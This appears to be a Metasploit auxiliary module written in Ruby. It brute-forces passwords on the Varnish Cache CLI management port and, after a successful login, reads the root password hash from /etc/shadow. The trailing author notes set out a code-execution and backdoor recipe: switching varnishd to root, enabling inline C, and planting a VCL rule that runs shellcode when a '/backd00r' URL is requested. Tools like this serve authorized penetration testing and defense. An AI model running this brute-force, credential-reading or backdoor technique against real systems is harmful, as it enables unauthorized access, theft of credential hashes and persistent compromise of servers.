##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Varnish Cache CLI Interface Bruteforce Utility',
      'Description'    => 'This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce
                           list of passwords. This module will also attempt to read the /etc/shadow root password hash
                           if a valid password is found. It is possible to execute code as root with a valid password,
                           however this is not yet implemented in this module.',
      'References'     =>
        [
          [ 'OSVDB', '67670' ],
          [ 'CVE', '2009-2936' ],
          # General
          [ 'URL', 'https://www.varnish-cache.org/trac/wiki/CLI' ],
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'Author'         => [ 'patrick' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(6082),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt") ]),
      ], self.class)

    deregister_options('USERNAME', 'USER_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS')
  end

  def run_host(ip)
        connect
        res = sock.get_once(-1,3) # detect banner
          if (res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./) # 107 auth
            vprint_status("Varnishd CLI detected - authentication required.")
            each_user_pass { |user, pass|
            sock.put("auth #{Rex::Text.rand_text_alphanumeric(3)}\n") # Cause a login fail.
            res = sock.get_once(-1,3) # grab challenge
            if (res =~ /107 \d+\s\s\s\s\s\s\n(\w+)\n\nAuthentication required./) # 107 auth
              challenge = $1
              secret = pass + "\n" # newline is needed
              response = challenge + "\n" + secret + challenge + "\n"
              response = Digest::SHA256.hexdigest(response)
              sock.put("auth #{response}\n")
              res = sock.get_once(-1,3)
              if (res =~ /107 \d+/) # 107 auth
                vprint_status("FAILED: #{secret}")
              elsif (res =~ /200 \d+/) # 200 ok
                print_good("GOOD: #{secret}")    
                
                report_auth_info(
                  :host => rhost,
                  :port => rport,
                  :sname => ('varnishd'),
                  :pass => pass,
                  :proof => "#{res}",
                  :source_type => "user_supplied",
                  :active => true
                )
                              
                sock.put("vcl.load #{Rex::Text.rand_text_alphanumeric(3)} /etc/shadow\n") # only returns 1 line of any target file.
                res = sock.get_once(-1,3)
                if (res =~ /root:([\D\S]+):/) # lazy.
                  if ($1[0] == "!")
                    vprint_error("/etc/shadow root uid is disabled.\n")
                  else
                    print_good("/etc/shadow root enabled:\nroot:#{$1}:")
                  end
                else
                  vprint_error("Unable to read /etc/shadow?:\n#{res}\n")
                end
                
                break
              else
                vprint_error("Unknown response:\n#{res}\n")
              end
            end
            }
          elsif (res =~ /Varnish Cache CLI 1.0/)
            print_good("Varnishd CLI does not require authentication!")
          else
            vprint_error("Unknown response:\n#{res}\n")
          end
        disconnect
    end
end

=begin

aushack notes:

- varnishd typically runs as root, forked as unpriv.
- 'param.show' lists configurable options.
- 'cli_timeout' is 60 seconds. param.set cli_timeout 99999 (?) if we want to inject payload into a client thread and avoid being killed.
- 'user' is nobody. param.set user root (may have to stop/start the child to activate)
- 'group' is nogroup. param.set group root (may have to stop/start the child to activate)
- (unless varnishd is launched with -r user,group (read-only) implemented in v4, which may make priv esc fail).
- vcc_unsafe_path is on. used to 'import ../../../../file' etc.
- vcc_allow_inline_c is off. param.set vcc_allow_inline_c on to enable code execution.
- code execution notes:

* quotes must be escaped \"
* \n is a newline
* C{ }C denotes raw C code.
* e.g. C{ unsigned char shellcode[] = \"\xcc\"; }C
* #import <stdio.h> etc must be "newline", i.e. C{ \n#include <stdlib.h>\n dosomething(); }C (without 2x \n, include statement will not interpret correctly).
* C{ asm(\"int3\"); }C can be used for inline assembly / shellcode.
* varnishd has it's own 'vcl' syntax. can't seem to inject C randomly - must fit VCL logic.
* example trigger for backdoor:

VCL server:
  vcl.inline foo "vcl 4.0;\nbackend b { . host = \"127.0.0.1\";  } sub vcl_recv { if (req.url ~ \"^/backd00r\") { C{ asm(\"int3\"); }C } } \n"
  vcl.use foo
  start

Attacker:
  telnet target 80
  GET /backd00r HTTP/1.1
  Host: 127.0.0.1

(... wait for child to execute debug trap INT3 / shellcode).

CLI protocol notes from website:

The CLI protocol used on the management/telnet interface is a strict request/response protocol, there are no unsolicited transmissions from the responding end.

Requests are whitespace separated tokens terminated by a newline (NL) character.

Tokens can be quoted with "..." and common backslash escape forms are accepted: (\n), (\r), (\t), (
), (\"), (\%03o) and (\x%02x)

The response consists of a header which can be read as fixed format or ASCII text:

    1-3      %03d      Response code
    4        ' '       Space
    5-12     %8d       Length of body
    13       \n        NL character.
Followed by the number of bytes announced by the header.

The Responsecode is numeric shorthand for the nature of the reaction, with the following values currently defined in include/cli.h:

enum cli_status_e {
        CLIS_SYNTAX     = 100,
        CLIS_UNKNOWN    = 101,
        CLIS_UNIMPL     = 102,
        CLIS_TOOFEW     = 104,
        CLIS_TOOMANY    = 105,
        CLIS_PARAM      = 106,
        CLIS_OK         = 200,
        CLIS_CANT       = 300,
        CLIS_COMMS      = 400,
        CLIS_CLOSE      = 500
};
=end

